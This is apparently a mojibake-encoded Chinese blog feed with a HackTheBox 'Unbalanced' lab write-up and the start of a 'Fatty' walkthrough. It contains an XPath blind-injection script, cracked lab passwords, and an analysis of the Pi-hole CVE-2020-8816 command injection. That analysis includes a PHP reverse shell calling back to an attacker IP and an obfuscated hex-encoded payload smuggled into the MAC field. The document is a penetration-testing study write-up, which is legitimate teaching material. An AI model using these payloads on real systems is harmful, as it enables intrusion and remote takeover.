http_headers           HTTP Header Statistics                  disabled                       info                   General Runtime Information             disabled                       service_times          Service Times (Percentiles)             disabled                                                                 filedescriptors        Process Filedescriptor Allocation       protected                      objects                All Cache Objects                       protected                      vm_objects             In-Memory and In-Transit Objects        protected                      io                     Server-side network read() size histograms      disabled               counters               Traffic and Resource Counters           protected                      peer_select            Peer Selection Algorithms               disabled                       digest_stats           Cache Digest and ICP blob               disabled                       5min                   5 Minute Average of Counters            protected                      60min                  60 Minute Average of Counters           protected                      utilization            Cache Utilization                       disabled                       histograms             Full Histogram Counts                   protected                      active_requests        Client-side Active Requests             disabled                       username_cache         Active Cached Usernames                 disabled openfd_objects         Objects with Swapout files open         disabled  store_digest           Store Digest                            disabled store_log_tags         Histogram of store.log tags             disabled storedir               Store Directory Stats                   disabled store_io               Store IO Interface Stats                disabled store_check_cachable_stats     storeCheckCachable() Stats              disabled  refresh                Refresh Algorithm Statistics            disabled  delay                  Delay Pool Levels                       disabled  forward                Request Forwarding Statistics           disabled cbdata                 Callback Data Registry Contents         protected sbuf                   String-Buffer statistics                protected events                 Event Queue                             protected netdb                  Network Measurement Database            disabled asndb                  AS Number Database                      disabled  carp                   CARP information                        disabled userhash               peer userhash information               disabled sourcehash             peer sourcehash information             disabled server_list            Peer Cache Statistics                   disabled</code></pre><p>å¯ä»¥çœ‹åˆ°é™¤äº†squidé…ç½®ä¸­å·²ç»æ ‡å‡ºçš„å¯ç”¨å‘½ä»¤å¤–,å…¶ä»–éƒ½æ˜¯disabledçš„ã€‚æ‰€ä»¥æˆ‘ä»¬ä¾æ¬¡è°ƒç”¨ä¸‹å¯»æ‰¾å…³é”®ä¿¡æ¯ã€‚<br>åœ¨è°ƒç”¨åˆ°<code>fqdncache</code>æ—¶</p><pre><code class="bash">FQDN Cache Statistics:FQDNcache Entries In Use: 13FQDNcache Entries Cached: 11FQDNcache Requests: 12782FQDNcache Hits: 0FQDNcache Negative Hits: 7080FQDNcache Misses: 5702FQDN Cache Contents:Address                                       Flg TTL Cnt Hostnames10.10.14.6                                     N  -16959   0127.0.1.1                                       H -001   2 unbalanced.htb unbalanced::1                                             H -001   3 localhost ip6-localhost ip6-loopback172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb10.10.10.200                                   N  -1086   0127.0.0.1                                       H -001   1 localhost172.17.0.1                                      H -001   1 intranet.unbalanced.htbff02::1                                         H -001   1 ip6-allnodesff02::2                                         H -001   1 ip6-allrouters10.10.14.65                                    N  025   0</code></pre><p>çœ‹åˆ°<code>intranet-host3.unbalanced.htb</code>åŠå¯¹åº”çš„ipã€‚ä¸éš¾æƒ³åˆ°å†…ç½‘é‡Œå¯èƒ½è¿˜æœ‰å…¶ä»–æœåŠ¡ã€‚è¿™é‡Œå…ˆè®¿é—®<code>172.31.179.2</code>ä¸<code>172.31.179.3</code>.å‘ç°ä¼šè¢«é‡å®šå‘åˆ°<code>/inranet.php</code>ä¹Ÿå°±æ˜¯è·Ÿä¹‹å‰åŒæ ·çš„ç½‘é¡µã€‚ä½†æ˜¯é¡ºç€è®¿é—®<code>172.31.179.1</code>æ—¶<br><img src="/2020/08/15/hackthebox-Unbalanced/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ²¡æœ‰å‡ºç°é‡å®šå‘ã€‚è¿™ç§æ€ªå¼‚è¡Œä¸ºå€¼å¾—é‡è§†ã€‚æˆ‘ä»¬å†æ¬¡è®¿é—®<code>172.31.179.1/intranet.php</code>ã€‚è¿™æ¬¡å°è¯•ç™»å½•æ—¶,ä¼šå‘ç°å®ƒä¼šå›æ˜¾<code>Invalid credentials.</code>.ä¹Ÿå°±æ˜¯è¯´å¯ä»¥è·ŸæœåŠ¡äº¤äº’äº†ã€‚</p><p>æ—¢ç„¶å¦‚æ­¤è‚¯å®šå°±è¦åœ¨ç™»å½•å‚æ•°ä½œæ–‡ç« ã€‚æ— éä¸å°±æ˜¯sqlié‚£ä¸€å¥—ã€‚ç®€å•å°è¯•åå‘ç°å¯†ç å¤„å­˜åœ¨æ³¨å…¥.å½“ä»¥<code>abc&#39; or &#39;1&#39;=&#39;1</code>ä½œä¸ºå¯†ç æ—¶ä¼šå›æ˜¾å››ä¸ªç”¨æˆ·åä¸å¯¹åº”é‚®ç®±ã€‚</p><pre><code> ritaRita Fubellirita@unbalanced.htbRole: HR ManagerjimJim Mickelsonjim@unbalanced.htbRole: Web DesignerbryanBryan Angstrombryan@unbalanced.htbRole: System AdministratorsarahSarah Goodmansarah@unbalanced.htbRole: Team Leader</code></pre><p>bryanæ˜¯<code>Administrator</code>.è¯´æ˜å¾ˆæœ‰å¯èƒ½å°±æ˜¯éœ€è¦ä»–çš„ä¿¡æ¯ã€‚ä¸è¿‡è¿™é‡Œæœ‰ä¸ªç»†èŠ‚ä¸Šéœ€è¦æ³¨æ„ä¸‹ã€‚å½“æˆ‘å°è¯•å¦‚<code>abc&#39; or 1=1#</code>è¿™æ ·çš„payloadä¸å¯è¡Œ,<code>abc&#39; or substr(&#39;abc&#39;,1,1)=&#39;a</code>ä¹Ÿä¸å¯è¡Œã€‚ä½†æ˜¯<code>abc&#39; or substring(&#39;abc&#39;,1,1)=&#39;a</code>æ˜¯å›æ˜¾äº†çœŸå€¼çš„ã€‚é‚£ä¹ˆè¿™é‡ŒçœŸçš„æ˜¯sqlæ³¨å…¥å—ï¼Ÿç­”æ¡ˆæ˜¯å¦å®šçš„ã€‚æˆ‘å¾ˆå¿«è”æƒ³åˆ°æ›¾ç»åœ¨npuctfä¸­å‡ºç°è¿‡ä¸€æ¬¡çš„xpathæ³¨å…¥ã€‚åŠ ä¸Šè¿™é‡Œå¹¶æ²¡æœ‰æ‰§è¡Œæ‰€è°“çš„ç™»å½•æ“ä½œï¼Œè€Œæ˜¯åœ¨ç•Œé¢å›æ˜¾htmlå—å†…å®¹ã€‚æˆ‘å¯ä»¥åˆ¤æ–­,è¿™é‡Œåº”è¯¥æ˜¯ä¸€ä¸ªxpathæ³¨å…¥è€Œä¸æ˜¯sqlæ³¨å…¥ã€‚</p><p>xpathæ¥ç›²æ³¨çš„è¯ã€‚æ¯”èµ·sqlå¸ƒå°”ç›²æ³¨æ›´åŠ ç®€å•</p><pre><code class="python">import requestsimport stringURL=&#39;http://172.31.179.1/intranet.php&#39;proxies={&#39;http&#39;:&quot;10.10.10.200:3128&quot;}users={&#39;bryan&#39;,&#39;rita&#39;,&#39;jim&#39;,&#39;sarah&#39;}for user in users:    password=&quot;&quot;    print(user)    for i in range(1,30):        a=0        print(i)        for j in string.printable:            data={&quot;Username&quot;:&quot;a&quot;,&quot;Password&quot;:&quot;&#39; or Username=&#39;&quot;+user+&quot;&#39; and substring(Password,&quot;+str(i)+&quot;,1)=&#39;&quot;+j+&quot;&quot;}            r=requests.post(URL,data=data,proxies=proxies)            if len(r.text) &gt; 7000:                password+=j                a=1                print(password)                break        if a==0:            break</code></pre><p>ç®€å•å†™ä¸ªç›²æ³¨è„šæœ¬,æ³¨æ„è¦æŒ‚å®ƒçš„proxyã€‚è¿™é‡Œä¼˜å…ˆè·‘bryançš„å¯†ç ã€‚å› ä¸ºè¿œç¨‹å®åœ¨å¤ªæ…¢äº†â€¦â€¦å¹¸å¥½bryanå°±æ˜¯ç³»ç»Ÿç”¨æˆ·ã€‚ä½¿ç”¨å®ƒçš„å¯†ç å³å¯sshç™»å½•ã€‚</p><p>å…¶ä»–äººçš„å¯†ç åæ¥èŠ±äº›æ—¶é—´ä¹Ÿè·‘å‡ºæ¥äº†ã€‚</p><pre><code>bryan:ireallyl0vebubblegum!!!rita:password01!jim:stairwaytoheavensarah:sarah4evah</code></pre><p>bryanç™»å½•ä¸Šå»å°±èƒ½æ‹¿åˆ°user.txtäº†ã€‚</p><p>ç®€å•è¯´è¿™ä¸€éƒ¨åˆ†å…¶å®éš¾åº¦çœŸçš„ä¸€èˆ¬ã€‚ä¸»è¦æ˜¯ä½¿ç”¨å®ƒç»™çš„proxyè¿™æ­¥å¯èƒ½æœ‰çš„äººæ²¡åšè¿‡ã€‚ä½†æ˜¯å‡å¦‚åˆ©ç”¨å¥½rsyncå¾—åˆ°çš„confå°±èƒ½å¾ˆå¿«çŸ¥é“è¿™ç‚¹ã€‚æ‰€ä»¥éš¾åº¦ä¸€èˆ¬ã€‚åé¢æ¯”è¾ƒè¿·æƒ‘çš„è¿˜æ˜¯xpathä¸sqliä¸èƒ½æ··æ·†ã€‚ä¸è¿‡é€šè¿‡ç®€å•çš„fuzzè¿˜æ˜¯èƒ½åˆ¤æ–­å‡ºæ¥çš„ã€‚</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>bryanæ–‡ä»¶å¤¹ä¸‹æœ‰ä¸€ä¸ªTODO</p><pre><code>############# Intranet #############* Install new intranet-host3 docker [DONE]* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]* Test intranet-host3 [DONE]* Add intranet-host3 to load balancer [DONE]* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]* Fix intranet-host2 [DONE]* Re-add intranet-host2 to load balancer (set default weight) [DONE]- Fix intranet-host1 [TODO]- Re-add intranet-host1 to load balancer (set default weight) [TODO]############ Pi-hole ############* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]* Set temporary admin password [DONE]* Create Pi-hole configuration script [IN PROGRESS]- Run Pi-hole configuration script [TODO]- Expose Pi-hole ports to the network [TODO]</code></pre><p>ä»è¿™é‡Œå¯ä»¥çœ‹å‡ºã€‚é¶æœºä¸Šå·²ç»è·‘å¥½äº†ä¸€ä¸ªdockerã€‚ä½†æ˜¯å®ƒæ˜¯è·‘åœ¨127ã€‚0.0.1çš„ã€‚å¹¶ä¸”æœ‰ä¸ª<code>admin</code>å¯†ç ã€‚Pi-hole é…ç½®æ–‡ä»¶å°šæœªå®Œæˆã€‚</p><p><code>ss -lntp</code>çœ‹ä¸‹ç«¯å£</p><pre><code class="bash">bryan@unbalanced:~$ ss -lntpState                    Recv-Q                   Send-Q                                       Local Address:Port                                       Peer Address:Port                   LISTEN                   0                        5                                                  0.0.0.0:873                                             0.0.0.0:*                      LISTEN                   0                        128                                              127.0.0.1:8080                                            0.0.0.0:*                      LISTEN                   0                        128                                              127.0.0.1:5553                                            0.0.0.0:*                      LISTEN                   0                        32                                                 0.0.0.0:53                                              0.0.0.0:*                      LISTEN                   0                        128                                                0.0.0.0:22                                              0.0.0.0:*                      LISTEN                   0                        5                                                     [::]:873                                                [::]:*                      LISTEN                   0                        32                                                    [::]:53                                                 [::]:*                      LISTEN                   0                        128                                                   [::]:22                                                 [::]:*                      LISTEN                   0                        128                                                      *:3128                                                  *:*  </code></pre><p>8080ä¸5553æ˜æ˜¾æ˜¯è·‘åœ¨æœ¬åœ°ä¸Šçš„ã€‚å…¶ä¸­8080å¯ä»¥curlåˆ°ã€‚ä¸è¿‡ä¼šæé†’æˆ‘ä»¬hostnameä¸å¯¹ã€‚</p><p>æ—¢ç„¶æ˜¯ä¸ªwebæœåŠ¡ã€‚é‚£å…ˆç«¯å£è½¬å‘åˆ°æœ¬åœ°çœ‹çœ‹é•¿ä»€ä¹ˆæ ·ã€‚æˆ‘ä»¬ç›´æ¥ç”¨sshè½¬å‘</p><pre><code class="bash">~C #è¿›å…¥sshå‘½ä»¤è¡Œ-L 8080:127.0.0.1:8080</code></pre><p>å¢åŠ ä¸€ä¸ª<code>Host: unbalanced</code><br><img src="/2020/08/15/hackthebox-Unbalanced/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å†æ¬¡æš´éœ²äº†ä¸€ä¸ª<code>pihole.unbalanced.htb</code>.ä»¥åŠå¯¹åº”çš„å†…ç½‘ip.</p><p>è®¿é—®è¿™ä¸ªpiholeçš„åå°<code>/admin</code>.å› ä¸ºä¹‹å‰æç¤ºè¿‡æˆ‘ä»¬temporary admin password .æ‰€ä»¥ç”¨adminå°±èƒ½ç™»å…¥ã€‚è¿›å»åå‘ç°æ˜¯ä¸ª4.3.2ç‰ˆæœ¬çš„pihole.</p><p><img src="/2020/08/15/hackthebox-Unbalanced/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æš‚æ—¶æ²¡æ€è·¯ã€‚ä¸è¿‡æœç´¢ä¸‹å‘ç°ç‰ˆæœ¬åœ¨CVE-2020-8816å¯ç”¨èŒƒå›´å†…ã€‚è¿™ä¸ªæ˜¯å¯ä»¥ç›´æ¥rceæ‹¿åˆ°www-dataçš„shellçš„ã€‚è™½ç„¶è·Ÿæˆ‘ä»¬ææƒrootæ²¡å•¥å…³ç³»ã€‚ä½†æ˜¯ä¸å¦¨ä¸€è¯•ã€‚<br>ç”¨è¿™çš„exp<br><a href="https://github.com/AndreyRainchik/CVE-2020-8816" target="_blank" rel="noopener">https://github.com/AndreyRainchik/CVE-2020-8816</a></p><p>å› ä¸ºæˆ‘ä»¬å·²ç»è½¬å‘å¥½ç«¯å£äº†ã€‚æ‰€ä»¥ç›´æ¥æ‰“å°±æ˜¯äº†<br><code>python3 CVE-2020-8816.py http://127.0.0.1:8080 admin 10.10.14.11 90001</code><br><img src="/2020/08/15/hackthebox-Unbalanced/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="/2020/08/15/hackthebox-Unbalanced/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>www-dataçš„è¯è‚¯å®šå¾—ç»§ç»­æ”¶é›†ä¿¡æ¯äº†ã€‚ä½†æ˜¯æˆ‘æ„æƒ³ä¸åˆ°çš„æ˜¯www-dataå±…ç„¶å¯ä»¥ç›´æ¥è¿›è¿™ä¸ªdockerçš„rootç›®å½•â€¦â€¦ç®€ç›´å¯æ€•ã€‚ç„¶åé‡Œé¢æœ‰ä¹‹å‰æåˆ°çš„configæ–‡ä»¶</p><pre><code class="bash">#!/bin/bash# Add domains to whitelist/usr/local/bin/pihole -w unbalanced.htb/usr/local/bin/pihole -w rebalanced.htb# Set temperature unit to Celsius/usr/local/bin/pihole -a -c# Add local host record/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1# Set privacy level/usr/local/bin/pihole -a -l 4# Set web admin interface password/usr/local/bin/pihole -a -p &#39;bUbBl3gUm$43v3Ry0n3!&#39;# Set admin email/usr/local/bin/pihole -a email admin@unbalanced.htb</code></pre><p>adminçš„å¯†ç åˆæ˜¯ä¸€ä¸ªè·Ÿ<code>bubblegum</code>æœ‰å…³çš„â€¦â€¦è¯•äº†ä¸‹sshç™»å½•rootæ²¡æˆã€‚suä¸€ä¸‹å±…ç„¶å°±æˆäº†â€¦â€¦<br><img src="/2020/08/15/hackthebox-Unbalanced/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ€ä¹ˆè¯´å‘¢ã€‚ææƒè¿™å—åªè¦nday pocå°±èƒ½æ‹¿www-data =&gt; ç„¶åå°±å¯ä»¥è¿›rootç›®å½•=&gt; ç„¶åç³»ç»Ÿå¯†ç ç›´æ¥å°±æš´éœ²å‡ºæ¥äº†ã€‚è¿™ä¸€è¿ä¸²æ“ä½œä»¤äººçª’æ¯ã€‚æœ‰ç‚¹åˆ»æ„è€Œä¸”è®©è¿™å°é¶æœºçš„ä½“éªŒç›´æ¥é™äº†ä¸€ä¸ªæ¡£æ¬¡ã€‚æ‰€ä»¥æ²¡å•¥æ€»ç»“çš„ã€‚</p><h2 id="CVE-2020-8816"><a href="#CVE-2020-8816" class="headerlink" title="CVE-2020-8816"></a>CVE-2020-8816</h2><p>å› ä¸ºåé¢æ²¡ä»€ä¹ˆæ”¶è·ï¼Œæ‰€ä»¥ç®€å•çœ‹äº†ä¸‹è¿™ä¸ªcveã€‚å‘ç°è¿˜æŒºæœ‰æ„æ€çš„ã€‚</p><p><a href="https://xz.aliyun.com/t/7511" target="_blank" rel="noopener">https://xz.aliyun.com/t/7511</a></p><p>é¦–å…ˆã€‚piholeæœ‰è¿™æ ·ä¸€ä¸ªåŠŸèƒ½<code>è®¾ç½®é™æ€DHCPï¼Œå°†IPåœ°å€å›ºå®šåˆ°ç»™å®šçš„MACåœ°å€ä¸Š</code><br>è€Œä»–çš„æºç é‡Œè°ƒç”¨äº†å‘½ä»¤æ‰§è¡Œæ‹¼æ¥</p><pre><code class="php">if(!strlen($error)){    exec(&quot;sudo pihole -a addstaticdhcp &quot;.$mac.&quot; &quot;.$ip.&quot; &quot;.$hostname);    $success .= &quot;A new static address has been added&quot;;}</code></pre><p>æ—¢ç„¶æ˜¯æ‹¼æ¥ã€‚å‡å¦‚æ²¡æœ‰è¿‡æ»¤åˆ°ä½é‚£å°±è‚¯å®šå¯ä»¥ç»•è¿‡ã€‚æˆ‘ä»¬çœ‹ä¸‹å®ƒä¸»è¦çš„è¿‡æ»¤æ–¹å¼ã€‚</p><pre><code class="php">function validMAC($mac_addr){  // Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case)  return (preg_match(&#39;/([a-fA-F0-9]{2}[:]?){6}/&#39;, $mac_addr) == 1); }......$mac = $_POST[&quot;AddMAC&quot;];  $ip = $_POST[&quot;AddIP&quot;];$hostname = $_POST[&quot;AddHostname&quot;];if(!validMAC($mac)){    $error .= &quot;MAC address (&quot;.htmlspecialchars($mac).&quot;) is invalid!&lt;br&gt;&quot;;}$mac = strtoupper($mac); </code></pre><p>è¿™ä¸ªæ­£åˆ™å†™çš„å¹¶ä¸æ­£ç¡®ã€‚æ¯”å¦‚æˆ‘ä»¬ç›´æ¥ä½¿ç”¨<code>aaaaaaaaaaaa</code>å°±èƒ½é€šè¿‡æ ¡éªŒã€‚ç”šè‡³å¯ä»¥åœ¨åé¢åŠ ä¸Šä»»æ„shellä»£ç </p><pre><code class="php">var_dump(validMAC(&#39;aaaaaaaaaaaa&amp;&amp;php -r \&#39;$sock=fsockopen(&quot;10.1.0.9&quot;,2256);exec(&quot;bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);\&#39;&#39;));//bool(true)</code></pre><p>ä¸è¿‡å”¯ä¸€é‡ç‚¹å°±æ˜¯ã€‚ä»–å¯¹æˆ‘ä»¬çš„è¾“å…¥è°ƒç”¨äº†htmlspecialcharsä»¥åŠ<code>strtoupper</code>.åè€…æ¯”è¾ƒå…³é”®ã€‚</p><p>è¿™æ—¶é¦–å…ˆå°±è€ƒéªŒåˆ©ç”¨çš„phpæŠ€å·§äº†ã€‚å› ä¸ºåˆæ³•çš„macåé¢è·Ÿä»»æ„è¯­å¥éƒ½æ˜¯å¯ä»¥çš„ã€‚é‚£è‡ªç„¶æˆ‘ä»¬é€‰æ‹©phpä»£ç æ‰§è¡Œå‡½æ•°ã€‚(phpè‡ªå¸¦å‡½æ•°ä¸åŒºåˆ†å¤§å°å†™)ã€‚ä½¿ç”¨<code>EXEC(HEX2BIN(xxxxx...))</code>å³å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚æ¥ä¸‹æ¥é‡ç‚¹å°±æ˜¯ç»•è¿‡è¢«å˜æˆå¤§å†™çš„<code>php -r</code>äº†ã€‚</p><p>è¿™ä¸€æ­¥å°±ç”¨åˆ°ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡æŠ€å·§äº†ã€‚å‡å¦‚æˆ‘ä»¬ä½¿ç”¨<code>aaaaaaaaaaaa$PATH</code>.ç³»ç»Ÿæ˜¯ä¼šè¿”å›PATHå˜é‡çš„</p><pre><code>/opt/pihole:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code></pre><p>è€Œå…¶ä¸­pihole,usræ­£å¥½å¯ä»¥æ„é€ å‡º<code>p h r</code>è¿™å‡ ä¸ªå­—æ¯ã€‚æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨</p><pre><code>W=${PATH#/???/}P=${W%%?????:}X=${PATH#/???/??}H=${X%%???:}Z=${PATH#:/??}R=${Z%%/}</code></pre><p>ç®€å•ä¸¾ä¸ªä¾‹å­ã€‚åŸºæœ¬ä¸Šå°±æ˜¯åˆ©ç”¨linuxé€šé…ç¬¦æ¥è¿›è¡Œæ„é€ ã€‚ååˆ†ç²¾å¦™</p><pre><code>root@pihole:/# W=${PATH#/???/}&amp;&amp;P=${W%%?????:*}&amp;&amp;echo $W &amp;&amp; echo  $Ppihole:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binp</code></pre><p>æœ€åä»¥ç±»ä¼¼çš„payloadå‘½ä»¤æ‰§è¡Œ</p><pre><code>aaaaaaaaaaaa&amp;&amp;W=${PATH#/???/}&amp;&amp;P=${W%%?????:*}&amp;&amp;X=${PATH#/???/??}&amp;&amp;H=${X%%???:*}&amp;&amp;Z=${PATH#*:/??}&amp;&amp;R=${Z%%/*}&amp;&amp;$P$H$P$IFS-$R$IFS&#39;EXEC(HEX2BIN(&quot;706870202D72202724736F636B3D66736F636B6F70656E282231302E312E302E39222C32323536293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27&quot;));&#39;&amp;&amp;</code></pre><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>å‰é¢å¾ˆæœ‰è¶£ã€‚åé¢å¾ˆç®€å•ã€‚ä¸è¿‡å¦‚æœæ·±å…¥ç ”ç©¶è¿™ä¸ªcveçš„è¯è¿˜æ˜¯æ¯”è¾ƒæœ‰æ”¶è·çš„ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> hackthebox </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Fatty-JavaExploits</title>
      <link href="2020/08/10/hackthebox-Fatty-JavaExploits/"/>
      <url>2020/08/10/hackthebox-Fatty-JavaExploits/</url>
      
        <content type="html"><![CDATA[<p> Faaty æ˜¯htbè¿™å‘¨åˆšé€€å½¹çš„é¶æœºã€‚æœ¬æ¥ä¸€å‘¨å‰è‡ªå·±æ‰“ç®—ä¸‹æ‰‹è¯•è¯•çš„,ä¸è¿‡åšäº†ä¸€ä¼šå‘ç°å› ä¸ºå³å°†é€€å½¹å°±å¹²è„†æç½®ç­‰ippsecå‡ºè§†é¢‘è‡ªå·±å†åš233. ä¸è¿‡æ•´ä½“æ¥è¯´è¿™å°é¶æœºçœŸçš„éå¸¸æœ‰è¶£ã€‚å¹¶ä¸”æ¶‰åŠåˆ°å¤§é‡çš„javaçŸ¥è¯†ã€‚åœ¨è¿™ä¸€æ¬¡å®é™…æ“ä½œä¸­è‡ªå·±æ‰çœŸæ­£ä½“ä¼šåˆ°å‰æ®µæ—¶é—´å·©å›ºjavaå¼€å‘çš„åŸºç¡€çŸ¥è¯†æœ‰å¤šä¹ˆé‡è¦ã€‚å› æ­¤è¿™é‡Œè®°å½•ä¸‹å…·ä½“æ“ä½œçš„æµç¨‹,å°†å­¦åˆ°çš„æ–°çŸ¥è¯†å·©å›ºä¸€ä¸‹ã€‚</p><a id="more"></a><p> å½“ç„¶ã€‚è¿™æ¬¡å®é™…æ“ä½œé€”ä¸­è¿˜æ˜¯æœ‰ä¸€å¤„å›°æ‰°ç€æˆ‘çš„åœ°æ–¹æ²¡æœ‰æ‰¾åˆ°å¥½çš„ç­”æ¡ˆã€‚å°±æ˜¯ideaä¸­èƒ½å¦é‡æ–°å¯¼å…¥å•ä¸ªjavaæ–‡ä»¶å¹¶ä¿®æ”¹å¼•å…¥jaråŒ…ä¸­classçš„å†…å®¹ã€‚</p><p> <img src="/2020/08/10/hackthebox-Fatty-JavaExploits/head.PNG" class="lazyload" data-srcset="head.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><ul><li>é¶æœºip: 10.10.10.174</li><li>æ”»å‡»æœº: 10.10.14.25</li></ul><h2 id="initial-foothold-to-user"><a href="#initial-foothold-to-user" class="headerlink" title="initial-foothold to user"></a>initial-foothold to user</h2><p>é¦–å…ˆnmapç®€å•æ‰«çš„ç»“æœåªæœ‰21,22ç«¯å£ã€‚21ç«¯å£å…è®¸åŒ¿åç™»å½•ã€‚å…¶ä¸­æœ‰4ä¸ªæ–‡ä»¶ã€‚ä¸€ä¸ªjaråŒ…ä¸ä¸‰ä¸ªnote</p><p>note.txt</p><pre><code>Dear members, because of some security issues we moved the port of our fatty java server from 8000 to the hidden and undocumented port 1337. Furthermore, we created two new instances of the server on port 1338 and 1339. They offer exactly the same server and it would be nice if you use different servers from day to day to balance the server load. We were too lazy to fix the default port in the &#39;.jar&#39; file, but since you are all senior java developers you should be capable of doing it yourself ;)Best regards, qtc</code></pre><p>ä»è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ã€‚è¿œç¨‹åº”è¯¥å¼€æ”¾äº†1337,1338,1339ç«¯å£æ¥ä½œä¸ºæœåŠ¡ç«¯ã€‚ç„¶åæˆ‘ä»¬è‡ªå·±ç”¨jaråŒ…å½“å®¢æˆ·ç«¯ã€‚</p><p>åŒæ—¶è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªjava thick clientçš„æ¦‚å¿µã€‚ç®€å•è¯´å°±æ˜¯æ•°æ®å¤„ç†æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†ç”±å®¢æˆ·ç«¯å®Œæˆã€‚</p><p>note2</p><pre><code>Dear members, we are currently experimenting with new java layouts. The new client uses a static layout. If your are using a tiling window manager or only have a limited screen size, try to resize the client window until you see the login from.Furthermore, for compatibility reasons we still rely on Java 8. Since our company workstations ship Java 11 per default, you may need to install it manually.Best regards, qtc</code></pre><p>note2 æç¤ºæˆ‘ä»¬ä½¿ç”¨java8.</p><p>note3</p><pre><code>Dear members, We had to remove all other user accounts because of some seucrity issues. Until we have fixed these issues, you can use my account:User: qtc Pass: clarabibiBest regards, qtc</code></pre><p>note3åˆ™ç›´æ¥æä¾›ç»™æˆ‘ä»¬ä¸€ç»„å¯è¡Œçš„è´¦å·ã€‚è‡³æ­¤noteå·²ç»çœ‹å®Œã€‚ftpæœåŠ¡ä¸Šè¿˜å‰©ä¸‹ä¸€ä¸ªfatty-client.jarã€‚æˆ‘ä»¬ä¸‹è½½ä¸‹æ¥è¿›è¡Œå®¡è®¡</p><p>å¼€å§‹æˆ‘æ˜¯ç›´æ¥æ‹¿åˆ°æœ¬æœºçš„ideaä¸Šçœ‹jaråŒ…çš„ã€‚é¦–å…ˆç»“æ„ä¸Šåº”è¯¥æ˜¯springæ¡†æ¶ç¼–å†™åŠŸèƒ½+swingç»„ä»¶ç¼–å†™guiã€‚ä½†æ˜¯å¹¶æ²¡æœ‰å¤ªå¤§æ”¶è·ã€‚æ¯”å¦‚å¸¸è§å¦‚<code>readObject</code>è¿™æ 